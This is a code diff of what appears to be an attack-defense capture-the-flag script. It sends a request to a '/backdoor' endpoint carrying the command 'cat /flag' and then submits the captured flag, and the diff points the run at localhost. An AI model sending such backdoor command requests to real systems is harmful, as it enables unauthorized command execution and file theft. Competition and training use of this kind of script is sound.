@@ -1,9 +1,18 @@
-from web import WebPayload, WebStep, file2ip_list, file2http_request
-
+from web import WebPayload, WebStep
 
 flag_submitter = WebStep(
     # $IP, $FLAG
-    request_message_template=file2http_request("./requests/submit_flag.http"),
+    """
+    POST /submit_flag HTTP/1.1
+    Host: 127.0.0.1:8080
+    User-Agent: CustomAgent
+    Accept: */*
+    Connection: keep-alive
+    Content-Type: application/x-www-form-urlencoded
+    Content-Length: 12
+
+    flag=$FLAG&ip=$IP
+""",
     post_extract={"$?": r"(.*)"},
 )
 
@@ -12,8 +21,8 @@ web1 = [
         [
             WebStep(
                 """
-                    GET /backdoor HTTP/1.1
-                    Host: $IP:8080
+                    GET /backdoor?cmd=cat%20%2Fflag HTTP/1.1
+                    Host: $IP:8081
                     User-Agent: CustomAgent
                     Accept: */*
                     Connection: keep-alive
@@ -36,4 +45,4 @@ if __name__ == "__main__":
             except Exception as e:
                 print(e)
 
-    list(map(run, file2ip_list("ip.txt")))
+    list(map(run, ["127.0.0.1"]))
